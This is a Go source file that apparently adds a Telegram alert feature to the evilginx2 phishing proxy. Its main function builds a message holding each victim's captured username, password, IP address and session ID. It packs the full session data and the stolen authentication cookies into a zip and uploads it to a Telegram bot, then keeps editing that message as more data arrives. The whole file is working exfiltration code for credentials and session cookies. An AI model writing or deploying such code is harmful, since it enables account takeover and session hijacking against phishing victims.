package core

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramConfig struct {
	Token  string `mapstructure:"token" json:"token" yaml:"token"`
	ChatId string `mapstructure:"chat_id" json:"chat_id" yaml:"chat_id"`
}

func (c *TelegramConfig) Enabled() bool {
	return c.Token != "" && c.ChatId != ""
}

func SendTelegramNotification(cfg *Config, s *Session, p *Phishlet) {
	if !cfg.telegramConfig.Enabled() {
		return
	}

	// Prepare message
	username := s.Username
	if username == "" {
		username = "N/A"
	}
	password := s.Password
	if password == "" {
		password = "N/A"
	}
	
	usernameCaptured := "❌ Not captured"
	if s.Username != "" {
		usernameCaptured = "✅ Captured"
	}
	passwordCaptured := "❌ Not captured"
	if s.Password != "" {
		passwordCaptured = "✅ Captured"
	}
	cookiesCaptured := "❌ Not captured"
	if len(s.CookieTokens) > 0 {
		cookiesCaptured = fmt.Sprintf("✅ Captured (%d domains)", len(s.CookieTokens))
	}
	customCaptured := "❌ Not captured"
	if len(s.Custom) > 0 {
		customCaptured = fmt.Sprintf("✅ Captured (%d items)", len(s.Custom))
	}

	msg := fmt.Sprintf("🚨 New Session Captured!\n\n"+
		"📋 Phishlet: %s\n"+
		"👤 Username: %s\n"+
		"🔑 Password: %s\n"+
		"🌐 IP Address: %s\n"+
		"🆔 Session ID: %s\n"+
		"⏰ Capture Time: %s\n"+
		"📊 Data Summary:\n"+
		"• Username: %s\n"+
		"• Password: %s\n"+
		"• Cookies: %s\n"+
		"• Custom Data: %s\n",
		s.Name, username, password, s.RemoteAddr, s.Id, time.Now().Format(time.RFC3339),
		usernameCaptured, passwordCaptured, cookiesCaptured, customCaptured)

	// Create Zip
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	// Add JSON dump
	if sessionData, err := json.MarshalIndent(s, "", "  "); err == nil {
		f, _ := zipWriter.Create("session.json")
		f.Write(sessionData)
	}

	// Add Cookies text format
	var cookies []map[string]interface{}
	for domain, tokens := range s.CookieTokens {
		for _, t := range tokens {
			cookies = append(cookies, map[string]interface{}{
				"domain": domain,
				"name":   t.Name,
				"value":  t.Value,
				"path":   t.Path,
				"http_only": t.HttpOnly,
			})
		}
	}
	if cookieData, err := json.MarshalIndent(cookies, "", "  "); err == nil {
		f, _ := zipWriter.Create("cookies.json")
		f.Write(cookieData)
	}

	zipWriter.Close()

	if s.TelegramMessageID == 0 {
		// First time sending - create new message
		msgID := sendToTelegram(cfg.telegramConfig.Token, cfg.telegramConfig.ChatId, msg, buf.Bytes())
		if msgID != 0 {
			s.TelegramMessageID = msgID
		}
	} else {
		// Update existing message
		editTelegramMessage(cfg.telegramConfig.Token, cfg.telegramConfig.ChatId, s.TelegramMessageID, msg, buf.Bytes())
	}
}

type TelegramResponse struct {
	Ok     bool `json:"ok"`
	Result struct {
		MessageId int `json:"message_id"`
	} `json:"result"`
}

func sendToTelegram(token, chatId, caption string, zipData []byte) int {
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatId)
	writer.WriteField("caption", caption)

	part, _ := writer.CreateFormFile("document", "session.zip")
	part.Write(zipData)

	writer.Close()

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token)
	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Error("telegram: failed to send notification: %v", err)
		return 0
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != http.StatusOK {
		log.Error("telegram: failed to send notification (status: %s): %s", resp.Status, string(respBody))
		return 0
	}

	var tgResp TelegramResponse
	if err := json.Unmarshal(respBody, &tgResp); err == nil && tgResp.Ok {
		return tgResp.Result.MessageId
	}
	return 0
}

func editTelegramMessage(token, chatId string, messageId int, caption string, zipData []byte) {
	// Telegram editMessageMedia requires multiform data with specific structure
	// We are editing the 'media' of the message
	
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)

	writer.WriteField("chat_id", chatId)
	writer.WriteField("message_id", fmt.Sprintf("%d", messageId))
	
	// Create the media JSON object
	mediaJSON := fmt.Sprintf(`{"type": "document", "media": "attach://session.zip", "caption": "%s"}`, escapeJSON(caption))
	writer.WriteField("media", mediaJSON)

	part, _ := writer.CreateFormFile("session.zip", "session.zip")
	part.Write(zipData)

	writer.Close()

	url := fmt.Sprintf("https://api.telegram.org/bot%s/editMessageMedia", token)
	req, _ := http.NewRequest("POST", url, body)
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Error("telegram: failed to edit notification: %v", err)
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		respBody, _ := ioutil.ReadAll(resp.Body)
		log.Error("telegram: failed to edit notification: %s", string(respBody))
	} else {
		log.Info("telegram: notification updated successfully")
	}
}

func escapeJSON(s string) string {
	b, _ := json.Marshal(s)
	// Remove outer quotes
	return string(b[1 : len(b)-1])
}
